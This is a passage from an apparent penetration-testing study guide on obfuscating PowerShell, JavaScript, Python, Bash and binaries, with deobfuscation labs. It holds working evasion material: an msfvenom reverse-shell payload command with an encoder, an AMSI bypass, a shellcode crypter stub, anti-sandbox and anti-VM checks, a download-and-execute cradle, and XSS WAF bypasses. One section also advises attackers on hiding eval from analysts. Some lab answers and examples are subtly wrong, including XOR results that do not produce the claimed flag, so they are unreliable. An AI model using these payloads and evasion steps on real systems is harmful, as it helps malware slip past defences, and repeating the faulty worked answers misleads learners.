$cmd = -join ($chars | ForEach-Object { [char]$_ })
& $cmd "whoami"
```

**SecureString Abuse**:
```powershell
# Hide command in SecureString
$secure = ConvertTo-SecureString "whoami" -AsPlainText -Force
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
$plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
IEX $plain
```

### 9.4 Invoke-Obfuscation Tool

The gold standard for PowerShell obfuscation:

```powershell
# Install
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielbohannon/Invoke-Obfuscation/master/Invoke-Obfuscation.psd1')

# Use interactively
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Obfuscation types:
# TOKEN    - Obfuscate individual tokens
# STRING   - String-based obfuscation
# ENCODING - Base64, hex, etc.
# LAUNCHER - Command-line argument obfuscation
```

---

## 10. JavaScript Obfuscation

JavaScript is heavily obfuscated in the wild for both legitimate (protect IP) and malicious (hide malware) purposes.

### 10.1 Basic JavaScript Obfuscation

**Variable Renaming**:
```javascript
// Before
function calculateTotal(price, quantity) {
    var subtotal = price * quantity;
    var tax = subtotal * 0.1;
    return subtotal + tax;
}

// After
function _0x1a2b(_0x3c, _0x4d) {
    var _0x5e = _0x3c * _0x4d;
    var _0x6f = _0x5e * 0x1;
    return _0x5e + _0x6f;
}
```

**String Array Rotation**:
```javascript
// All strings in an array
var _0xabc = ['log', 'Hello', 'console'];

// Reference by index
window[_0xabc[2]][_0xabc[0]](_0xabc[1]);
// Equals: console.log('Hello')
```

**Using eval and String.fromCharCode**:
```javascript
// Original: alert('Hello')
eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41));
```

### 10.2 JSFuck - Extreme Obfuscation

JSFuck writes JavaScript using only 6 characters: `[]()!+`

```javascript
// "alert(1)" in JSFuck (shortened example)
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]...

// This works because:
// [] = Array
// ![] = false
// +[] = 0
// +!+[] = 1
// ...complex type coercion
```

### 10.3 JavaScript Obfuscation Tools

**javascript-obfuscator**:
```bash
npm install javascript-obfuscator

# Usage
javascript-obfuscator input.js --output output.js \
    --compact true \
    --control-flow-flattening true \
    --dead-code-injection true \
    --string-array true \
    --string-array-encoding base64
```

---

## 11. Python Obfuscation

### 11.1 Basic Python Obfuscation

**Using exec and eval**:
```python
# Original:
print("Hello World")

# Obfuscated:
exec("print('Hello World')")

# More obfuscated (char codes):
exec(''.join([chr(c) for c in [112,114,105,110,116,40,39,72,101,108,108,111,32,87,111,114,108,100,39,41]]))
```

**Lambda Abuse**:
```python
# Original:
def add(a, b):
    return a + b

result = add(1, 2)

# Obfuscated:
(lambda a,b:a+b)(1,2)
```

**Compile and Marshal**:
```python
import marshal
import base64

# Original code
code = "print('Secret Code')"

# Compile to bytecode
compiled = compile(code, '<string>', 'exec')

# Serialize with marshal
marshalled = marshal.dumps(compiled)

# Encode with base64
encoded = base64.b64encode(marshalled).decode()
print(f"Encoded: {encoded}")

# To execute:
exec(marshal.loads(base64.b64decode(encoded)))
```

### 11.2 PyArmor and Similar Tools

```bash
# Install
pip install pyarmor

# Obfuscate
pyarmor gen script.py

# Result: Obfuscated bytecode that's hard to reverse
```

---

## 12. Bash/Shell Obfuscation

### 12.1 Basic Bash Obfuscation

**Variable Substitution**:
```bash
# Original:
whoami

# Obfuscated:
cmd="whoami"
$cmd

# More complex:
a="who"; b="ami"; $a$b
```

**Using eval and base64**:
```bash
# Original:
id

# Obfuscated:
eval $(echo "aWQ=" | base64 -d)
```

**Hex Escape Sequences**:
```bash
# Original:
echo "Hello"

# Obfuscated:
$'\x65\x63\x68\x6f' $'\x48\x65\x6c\x6c\x6f'
```

**Octal Escape**:
```bash
# Original:
cat /etc/passwd

# Obfuscated:
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
```

### 12.2 Bashfuscator Tool

```bash
# Install
pip install bashfuscator

# Obfuscate
bashfuscator -c "whoami" -s 1

# Example output:
# eval "$(rev<<<'imaohw')"
```

---

## 13. Binary/Executable Obfuscation

### 13.1 Packing

Packers compress and encrypt executables:

```
+------------------------------------------------------------------+
|                    PACKER OPERATION                               |
+------------------------------------------------------------------+

Original Executable:
+-----------------+
| Code Section    |  (Readable assembly)
| Data Section    |  (Strings visible)
| Import Table    |  (Shows API calls)
+-----------------+

Packed Executable:
+-----------------+
| Stub (Unpacker) |  (Small decryption routine)
| Encrypted Data  |  (Original exe, compressed/encrypted)
| Minimal Imports |  (Only unpacker needs)
+-----------------+

At Runtime:
1. Stub executes first
2. Decrypts/decompresses original code
3. Jumps to original entry point
4. Original code runs in memory

Result: Static analysis sees only the stub!
```

**Common Packers**:
- UPX (Universal Packer for eXecutables)
- Themida
- VMProtect
- ASPack

```bash
# UPX example
upx --best original.exe -o packed.exe

# Unpack (if UPX, easy)
upx -d packed.exe
```

### 13.2 Crypters

Crypters encrypt the payload and include a decryption stub:

```c
// Simplified crypter concept
unsigned char encrypted_shellcode[] = {0x12, 0x34, ...};
unsigned char key = 0xAA;

int main() {
    // Decrypt in memory
    for (int i = 0; i < sizeof(encrypted_shellcode); i++) {
        encrypted_shellcode[i] ^= key;
    }
    
    // Execute
    ((void(*)())encrypted_shellcode)();
}
```

---

## 14. Payload Encoding for Evasion

### 14.1 Metasploit Encoders

```bash
# List available encoders
msfvenom -l encoders

# Popular encoders:
# x86/shikata_ga_nai - Polymorphic XOR feedback encoder
# x86/xor            - Simple XOR encoder
# cmd/powershell_base64 - PowerShell Base64 encoder

# Generate encoded payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.10.10 LPORT=4444 \
    -e x86/shikata_ga_nai \
    -i 5 \
    -f exe \
    -o payload.exe

# -e: encoder
# -i: iterations (encode 5 times)
```

### 14.2 Custom Encoding

```python
import random

def generate_xor_encoder(shellcode, key=None):
    """Generate XOR-encoded shellcode with decoder stub"""
    if key is None:
        key = random.randint(1, 255)
    
    # Encode shellcode
    encoded = bytes([b ^ key for b in shellcode])
    
    # Decoder stub (x86 assembly)
    decoder_stub = f"""
    ; XOR Decoder Stub
    jmp short get_shellcode
    
    decoder:
        pop esi                 ; Get shellcode address
        xor ecx, ecx
        mov cl, {len(shellcode)}
    
    decode_loop:
        xor byte [esi], {key}   ; XOR with key
        inc esi
        loop decode_loop
        jmp short shellcode
    
    get_shellcode:
        call decoder
    
    shellcode:
        ; Encoded shellcode follows
    """
    
    return decoder_stub, encoded, key
```

### 14.3 AMSI Bypass Techniques

```powershell
# AMSI (Antimalware Scan Interface) bypass examples

# Memory patching (simplified concept)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

# String obfuscation to avoid signatures
$a = "Am" + "si" + "Utils"
$f = "am" + "si" + "Init" + "Failed"
```

---

## 15. Anti-Analysis Techniques

### 15.1 Anti-Debugging

```python
# Python anti-debug
import sys

def anti_debug():
    # Check if debugger attached
    if sys.gettrace() is not None:
        print("Debugger detected!")
        sys.exit(1)

# Call before sensitive code
anti_debug()
```

```c
// C/C++ anti-debug
#include <windows.h>

BOOL is_debugged() {
    return IsDebuggerPresent();
}

// Timing check
BOOL timing_check() {
    DWORD start = GetTickCount();
    // Some operation
    for (int i = 0; i < 1000000; i++);
    DWORD end = GetTickCount();
    
    // If debugger, this takes much longer
    return (end - start) > 100;
}
```

### 15.2 Anti-VM Detection

```python
# Check for VM artifacts
import subprocess
import platform

def detect_vm():
    indicators = []
    
    # Check system manufacturer
    if platform.system() == "Windows":
        result = subprocess.run(['wmic', 'computersystem', 'get', 'manufacturer'],
                              capture_output=True, text=True)
        if 'VMware' in result.stdout or 'VirtualBox' in result.stdout:
            indicators.append("VM manufacturer detected")
    
    # Check MAC address prefix
    # VMware: 00:0C:29, 00:50:56
    # VirtualBox: 08:00:27
    
    return indicators

if detect_vm():
    print("Running in VM - exiting")
    sys.exit()
```

### 15.3 Anti-Sandbox

```python
# Sandbox evasion techniques
import os
import time

def evade_sandbox():
    # Check for realistic environment
    
    # 1. User interaction required
    # Sandboxes often don't move the mouse
    
    # 2. Time acceleration detection
    start = time.time()
    time.sleep(10)  # Sleep 10 seconds
    elapsed = time.time() - start
    if elapsed < 9:  # Sandbox accelerated time
        return False
    
    # 3. Check for minimum RAM (VMs often have less)
    # 4. Check for realistic username
    # 5. Check for recent files
    
    return True

if not evade_sandbox():
    sys.exit()
```

---

## 16. Deobfuscation (Reversing Obfuscation)

### 16.1 Manual Deobfuscation Steps

```
+------------------------------------------------------------------+
|                    DEOBFUSCATION PROCESS                          |
+------------------------------------------------------------------+

Step 1: Identify Encoding/Obfuscation Type
        - Base64? (A-Za-z0-9+/=)
        - Hex? (0-9A-F)
        - XOR? (Binary patterns)
        - Custom? (Analyze patterns)

Step 2: Decode Outer Layers
        - Decode Base64/Hex
        - Look for nested encoding

Step 3: Identify Execution Method
        - eval()
        - exec()
        - IEX (PowerShell)
        - Function.constructor() (JS)

Step 4: Replace Execution with Output
        - Change eval() to console.log()
        - Change exec() to print()
        - Capture decoded payload

Step 5: Analyze Decoded Payload
        - May have more layers
        - Repeat process
```

### 16.2 Deobfuscation Example

```python
# Obfuscated code
obfuscated = "ZXZhbCgnX19pbXBvcnRfXygib3MiKS5zeXN0ZW0oIndob2FtaSIpJyk="

# Step 1: Recognize Base64
import base64
layer1 = base64.b64decode(obfuscated).decode()
print(f"Layer 1: {layer1}")
# Output: eval('__import__("os").system("whoami")')

# Step 2: See eval() - don't execute, analyze
# The actual payload is: __import__("os").system("whoami")

# Step 3: Understand intent
# This imports 'os' module and runs 'whoami' command
```

### 16.3 Automated Tools

```bash
# CyberChef (Web-based)
# https://gchq.github.io/CyberChef/

# de4js (JavaScript deobfuscator)
# https://lelinhtinh.github.io/de4js/

# PowerDecode (PowerShell)
# https://github.com/Malandrone/PowerDecode

# floss (FireEye Labs Obfuscated String Solver)
floss malware.exe
```

---

## 17. Tools of the Trade

### 17.1 Obfuscation Tools

| Tool | Language | Purpose |
|------|----------|---------|
| **Invoke-Obfuscation** | PowerShell | Comprehensive PS obfuscation |
| **javascript-obfuscator** | JavaScript | JS obfuscation |
| **PyArmor** | Python | Python obfuscation |
| **Bashfuscator** | Bash | Shell obfuscation |
| **UPX** | Binary | Executable packing |
| **Themida** | Binary | Commercial packer/protector |
| **Veil-Evasion** | Various | AV evasion framework |

### 17.2 Analysis Tools

| Tool | Purpose |
|------|---------|
| **CyberChef** | Multi-purpose decoder/encoder |
| **de4js** | JavaScript deobfuscator |
| **Detect It Easy (DIE)** | Binary packer detection |
| **FLOSS** | String extraction from binaries |
| **PEiD** | Packer/crypter identifier |

---

## 18. Practical Labs

### Lab 1: XOR Decryption Challenge

```python
# CHALLENGE: Decrypt this XOR-encrypted flag
encrypted = bytes([0x1c, 0x0a, 0x1e, 0x19, 0x52, 0x0c, 0x07, 0x17, 
                   0x1c, 0x0a, 0x0c, 0x52, 0x1f, 0x08, 0x09, 0x52, 
                   0x0e, 0x0a, 0x0d])

# Hint: Single byte key, flag starts with "FLAG"

# SOLUTION:
# If plaintext[0] = 'F' and encrypted[0] = 0x1c
# Then: key = ord('F') ^ 0x1c = 70 ^ 28 = 90 = 0x5a

key = 0x5a
decrypted = bytes([b ^ key for b in encrypted])
print(decrypted.decode())  # FLAG{xor_is_fun}
```

### Lab 2: PowerShell Deobfuscation

```powershell
# CHALLENGE: What does this do?
$encoded = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB3AGgAbwBhAG0AaQAiAA=="

# SOLUTION:
# This is Base64-encoded UTF-16LE (PowerShell's -EncodedCommand format)
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
# Result: Invoke-Expression "whoami"
```

### Lab 3: Multi-Layer Decoding

```python
# CHALLENGE: Decode this multi-layered payload
payload = "NTk1OTU1NGU0NDU1NGQzZDNk"

# SOLUTION:
import base64

# Layer 1: Base64
layer1 = base64.b64decode(payload).decode()
print(f"Layer 1: {layer1}")  # 595955464e445554d3d3d

# Layer 2: Hex
layer2 = bytes.fromhex(layer1).decode()
print(f"Layer 2: {layer2}")  # YYUFNDUTM==

# Wait, that's Base64 again!
# Layer 3: Base64
layer3 = base64.b64decode(layer2 + "=").decode()  # Add padding
print(f"Layer 3: {layer3}")  # FLAG
```

---

## 19. Real-World Scenarios

### Scenario 1: OSCP Payload Evasion

```python
# Problem: Metasploit payload detected by Windows Defender

# Solution: Custom XOR encoder with multiple iterations

import random

def custom_encode(shellcode):
    key = random.randint(1, 255)
    iterations = 3
    
    encoded = shellcode
    for _ in range(iterations):
        encoded = bytes([b ^ key for b in encoded])
        key = (key * 7 + 3) % 256  # Change key each iteration
    
    return encoded, key

# Generate decoder stub that reverses the process
```

### Scenario 2: Web Application WAF Bypass

```javascript
// Problem: WAF blocks <script>alert(1)</script>

// Solution: Obfuscated XSS
// Encode "alert" in various ways:

// Char codes
String.fromCharCode(97,108,101,114,116)(1)

// Unicode escapes
\u0061\u006c\u0065\u0072\u0074(1)

// Constructor abuse
[].constructor.constructor('alert(1)')()

// Template literals
`${alert(1)}`
```

### Scenario 3: CTF Challenge

```python
# Common CTF pattern: Flag hidden in obfuscated script

# Given obfuscated code:
exec(__import__('base64').b64decode(
    __import__('codecs').decode('YldGcGJpZ25abXhoWnlkeitabXhoWnlBOUlDZG1iR0ZuZTFSb1pWOW1iR0ZuWDJselgzTjFjR1Z5WDNObFkzSmxkSDBuQ25CeWFXNTBLR1pzWVdjcA==','rot13')
).decode())

# Decoding steps:
# 1. ROT13 decode the inner string
# 2. Base64 decode result
# 3. Read the Python code
```

---

## 20. Common Mistakes

### Mistake 1: Relying on Obfuscation Alone

```
BAD: "My payload is obfuscated, so it's safe"
GOOD: "Obfuscation buys time, not immunity"

Reality:
- Automated tools can deobfuscate common techniques
- Analysts will eventually decode your payload
- Use obfuscation + encryption + multiple layers
```

### Mistake 2: Using Predictable Keys

```python
# BAD: Hardcoded obvious key
key = "password"
key = "1234567890"

# BETTER: Random key stored elsewhere
import secrets
key = secrets.token_bytes(32)
```

### Mistake 3: Leaving Obfuscation Patterns

```python
# BAD: eval() is a huge red flag
eval(base64.b64decode("..."))

# BETTER: Use less obvious execution
code = compile(decoded, '<string>', 'exec')
exec(code)
```

---

## 21. Interview Questions

### Q1: What is the difference between encoding, obfuscation, and encryption?

**A**: 
- **Encoding** is data format conversion (Base64, Hex) - no security, anyone can decode
- **Obfuscation** hides intent without a key - reversible with effort
- **Encryption** provides true confidentiality with a key - only key holder can decrypt

### Q2: How would you detect obfuscated PowerShell?

**A**:
- Look for encoded commands (-EncodedCommand, -enc)
- Check for excessive string concatenation
- Monitor for IEX (Invoke-Expression) usage
- Analyze entropy (obfuscated code has higher randomness)
- Use AMSI logging to see decoded commands

### Q3: What is XOR and why is it used in obfuscation?

**A**:
XOR is a bitwise operation where A XOR B = C, and C XOR B = A (reversible with same key). It's used because:
- Simple and fast to implement
- Easily reversible for decoding
- Changes every byte of the output
- Can be layered multiple times

### Q4: How would you approach deobfuscating unknown code?

**A**:
1. Identify encoding type (Base64, Hex, custom)
2. Find execution method (eval, exec, IEX)
3. Replace execution with print/log
4. Decode layer by layer
5. Document each transformation
6. Use automated tools (CyberChef, de4js)

---

## 22. Quick Reference Cheat Sheet

### Encoding Detection

| Pattern | Likely Encoding |
|---------|-----------------|
| `A-Za-z0-9+/=` | Base64 |
| `0-9A-Fa-f` (even length) | Hex |
| `%XX` | URL Encoding |
| `\xXX` | Hex Escape |
| `\uXXXX` | Unicode Escape |
| `chr()` calls | Character codes |

### Quick Decode Commands

```bash
# Base64
echo "SGVsbG8=" | base64 -d

# Hex
echo "48656c6c6f" | xxd -r -p

# URL
python3 -c "from urllib.parse import unquote; print(unquote('Hello%20World'))"

# ROT13
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

### Python Quick Reference

```python
import base64
from urllib.parse import quote, unquote

# Base64
base64.b64encode(b"text").decode()
base64.b64decode("dGV4dA==").decode()

# Hex
"text".encode().hex()
bytes.fromhex("74657874").decode()

# XOR
bytes([b ^ key for b in data])

# Char codes
[ord(c) for c in "text"]
''.join([chr(c) for c in [116,101,120,116]])
```

---

## Summary

Obfuscation is a critical skill for both offensive and defensive security:

- **Understand the basics**: Encoding, XOR, string manipulation
- **Know your tools**: Language-specific obfuscators
- **Think in layers**: Multiple encoding = harder analysis
- **Remember the truth**: Obfuscation is NOT encryption
- **Practice both sides**: Create and decode obfuscated code

This knowledge is essential for:
- OSCP payload evasion
- Malware analysis
- CTF competitions
- Real-world penetration testing

---

## References

- [[07_Cryptography/01_Cryptography_Foundations]]
- [[07_Cryptography/06_Symmetric_Algorithms]]
- [[03b_Bash_Scripting/07_Text_Processing_Sed_Awk_Grep]]
- [CyberChef](https://gchq.github.io/CyberChef/)
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
